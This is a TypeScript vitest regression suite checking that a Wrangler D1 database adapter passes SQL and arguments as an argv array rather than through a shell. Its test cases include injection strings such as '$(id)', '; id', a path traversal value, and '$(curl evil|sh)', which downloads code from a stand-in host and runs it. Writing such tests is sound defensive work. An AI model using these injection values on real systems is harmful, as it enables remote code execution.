import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { existsSync, readFileSync } from "fs";

/**
 * P0-1 命令注入回归（对应 reviews/regression-cases-p0-李哥.md A 节）
 *
 * 断言标准：**没进 shell**，不是"命令跑通了"。
 * - execSync 必须零调用（修复前实现是 execSync 拼字符串）；
 * - execFileSync 收到的必须是 argv 数组，且 SQL 逐字节等于入参（不转义、不改换行）；
 * - dbName / configPath 非法值必须在进入子进程前抛错。
 */

const mocks = vi.hoisted(() => ({
    execFileSync: vi.fn((_cmd: string, _args: string[], _options?: unknown) => ""),
    execSync: vi.fn((_cmd: string) => {
        throw new Error("execSync 不应被调用：命令必须走 execFileSync 的 argv，不能进 shell");
    }),
}));

vi.mock("child_process", () => ({
    execFileSync: (cmd: string, args: string[], options?: unknown) => mocks.execFileSync(cmd, args, options),
    execSync: (cmd: string) => mocks.execSync(cmd),
}));

// eslint-disable-next-line import/first
import { WranglerDBAdapter } from "../../../src/util/db/wranglerDBAdapter";

const INLINE_SQL_LIMIT = 32 * 1024;

interface Captured {
    cmd: string;
    args: string[];
    fileContent?: string;
    fileStillExistsAfterCall?: boolean;
}

let captured: Captured[] = [];

function lastArgs(): string[] {
    const call = mocks.execFileSync.mock.calls.at(-1);
    expect(call, "execFileSync 应被调用一次").toBeTruthy();
    return call![1] as string[];
}

function valueAfter(args: string[], flag: string): string | undefined {
    const idx = args.indexOf(flag);
    return idx >= 0 ? args[idx + 1] : undefined;
}

describe("P0-1 WranglerDBAdapter 命令注入回归", () => {
    let logSpy: ReturnType<typeof vi.spyOn>;
    let errSpy: ReturnType<typeof vi.spyOn>;

    beforeEach(() => {
        captured = [];
        mocks.execFileSync.mockReset();
        mocks.execSync.mockClear();
        mocks.execFileSync.mockImplementation((cmd: string, args: string[]) => {
            const item: Captured = { cmd, args };
            const file = valueAfter(args, "--file");
            if (file) {
                // 临时文件在 adapter 的 finally 里删除：必须在调用当场读取
                item.fileContent = readFileSync(file, "utf-8");
                item.fileStillExistsAfterCall = false;
            }
            captured.push(item);
            return "";
        });
        logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
        errSpy = vi.spyOn(console, "error").mockImplementation(() => {});
    });

    afterEach(() => {
        logSpy.mockRestore();
        errSpy.mockRestore();
    });

    describe("A1 注入字符集不得执行", () => {
        const cases: { name: string; sql: string }[] = [
            { name: "命令替换 $()", sql: "SELECT '$(id)'" },
            { name: "反引号", sql: "SELECT `id`" },
            { name: "分号分隔的多语句", sql: "SELECT 1; id" },
            {
                name: "引号混合的 INSERT",
                sql: `INSERT INTO user (name) VALUES ('a"b''c');`,
            },
            {
                name: "含换行的多行 SQL（修复前会被替换成空格）",
                sql: "INSERT INTO t (v) VALUES ('line1\nline2');\nSELECT 1;",
            },
        ];

        for (const { name, sql } of cases) {
            it(`SQL 含${name}时 execSync 零调用且 SQL 逐字节透传`, () => {
                const adapter = new WranglerDBAdapter("--local", "", "gt_ai_gateway");
                adapter.exec(sql);

                // ① 没进 shell
                expect(mocks.execSync).not.toHaveBeenCalled();
                expect(mocks.execSync).toHaveBeenCalledTimes(0);

                // ② argv 数组调用，SQL 作为独立参数原样传入
                expect(mocks.execFileSync).toHaveBeenCalledTimes(1);
                expect(lastArgs()).toContain(sql);
                expect(valueAfter(lastArgs(), "--command")).toBe(sql);

                // ③ 未被引号/转义改写，换行也未丢失
                for (const ch of ["$(", "`", ";", "\n", "'"]) {
                    if (sql.includes(ch)) {
                        expect(valueAfter(lastArgs(), "--command")).toContain(ch);
                    }
                }
            });
        }

        it("超长 SQL 走 --file，内容与入参一致且临时文件被清理", () => {
            const adapter = new WranglerDBAdapter("--local", "", "gt_ai_gateway");
            const longSql = `INSERT INTO t (v) VALUES ('${"x".repeat(INLINE_SQL_LIMIT + 1024)}');
SELECT '$(id)';`;

            adapter.exec(longSql);

            const args = lastArgs();
            expect(mocks.execSync).not.toHaveBeenCalled();
            expect(args).toContain("--file");
            expect(args).not.toContain("--command");

            const file = valueAfter(args, "--file")!;
            expect(existsSync(file), "临时 SQL 文件应在 finally 中删除").toBe(false);
            expect(captured[0].fileContent).toBe(longSql);
        });

        it("query() 走 --json 且同样不进 shell", () => {
            mocks.execFileSync.mockImplementation((cmd: string, args: string[]) => {
                captured.push({ cmd, args });
                return JSON.stringify([{ results: [{ n: 1 }] }]);
            });

            const adapter = new WranglerDBAdapter("--remote", "", "gt_ai_gateway");
            const rows = adapter.query<{ n: number }>("SELECT 1 AS n");

            expect(rows).toEqual([{ n: 1 }]);
            expect(mocks.execSync).not.toHaveBeenCalled();
            expect(lastArgs()).toContain("--json");
        });
    });

    describe("A2 参数白名单", () => {
        const badArgs: { label: string; configPath?: string; dbName?: string }[] = [
            { label: "dbName 路径穿越", dbName: "../../etc/x" },
            { label: "dbName 注入分号", dbName: "gt; id" },
            { label: "dbName 命令替换", dbName: "$(id)" },
            { label: "dbName 反引号", dbName: "`id`" },
            { label: "configPath 注入分号", configPath: "/tmp/x; id" },
            { label: "configPath 命令替换", configPath: "$(curl evil|sh)" },
            { label: "configPath 带空格", configPath: "/tmp/x y" },
        ];

        for (const { label, dbName, configPath } of badArgs) {
            it(`${label} 必须抛错且不产生子进程`, () => {
                expect(
                    () => new WranglerDBAdapter("--local", configPath ?? "", dbName ?? "gt_ai_gateway"),
                ).toThrow(/Invalid (dbName|configPath)/);

                expect(mocks.execFileSync).not.toHaveBeenCalled();

                expect(mocks.execSync).not.toHaveBeenCalled();
            });
        }

        it("合法 dbName / configPath 的 argv 顺序正确", () => {
            const adapter = new WranglerDBAdapter("--remote", "./wrangler.toml", "gt-ai-gateway");
            adapter.exec("SELECT 1");

            expect(mocks.execSync).not.toHaveBeenCalled();
            expect(mocks.execFileSync).toHaveBeenCalledWith(
                "npx",
                ["wrangler", "d1", "execute", "gt-ai-gateway", "--remote", "--config", "./wrangler.toml", "--command", "SELECT 1"],
                expect.objectContaining({ encoding: "utf-8" }),
            );
        });

        it("未配置 configPath 时不追加 --config", () => {
            const adapter = new WranglerDBAdapter("--local", "", "gt_ai_gateway");
            adapter.exec("SELECT 1");

            const args = lastArgs();
            expect(args).not.toContain("--config");
            expect(args.slice(0, 5)).toEqual(["wrangler", "d1", "execute", "gt_ai_gateway", "--local"]);
        });
    });
});
